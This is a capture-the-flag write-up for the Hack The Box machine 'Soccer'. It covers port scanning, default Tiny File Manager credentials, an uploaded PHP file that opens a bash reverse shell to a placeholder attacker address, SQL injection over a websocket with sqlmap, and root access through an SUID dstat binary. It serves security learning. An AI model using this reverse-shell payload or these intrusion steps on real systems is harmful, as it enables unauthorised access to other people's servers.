# Soccer HTB

## Vulnerabilities:

* Arbitrary file upload
* RCE
* SQLI
* sqlmap
* websocket
* enumeration
* Tinty File Manager file upload
* missconfiguration
* php
* python
* dstat



## NMAP:

```nse
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 63
9091/tcp open  xmltec-xmlmail syn-ack ttl 63



PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
|_  256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Thu, 08 Jun 2023 16:01:49 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Thu, 08 Jun 2023 16:01:49 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
```


## Discovering:

subdomain fuzz:

none

directory fuzz:

/tiny file manager login
Default username/password: admin/admin@123


uploaded a malicious php file we can perform rce

```php
<?php
    system("bash -c 'bash -i >& /dev/tcp/<ip>/port 0>&1'");
?>
```

## Exploit:
performing a ws script you can make a request with web socket
and get an "id" parameter in our local host to get information using
sqlmap and retrieve the whole database information
and get the ssh session as **player** user



## Privilege scalation:
check the configuration with

```bash
find / -perm -4000 2>/dev/null
```

check for the file *dstat*
and searching further you can find the way to get
session as root because the file dstat has SUID
permissions. And get the root





### Resume:

* Tiny file manager
* search for default credentials
* Get access as admin
* Upload a malicious file as admin with php executable code
* Get a reverse shell and find the network tcp local running
* Add a new subdomain found and start the intercepting
* use python to get a sqli in our localhost with websocket-client
* SQLMAP to get the vulnerable tables and get the user with credentials to peform ssh login
* Check with Linpeas the vulnerable files or make a suitable find over the SUID files in the **/** and finally get a reverse shell as root
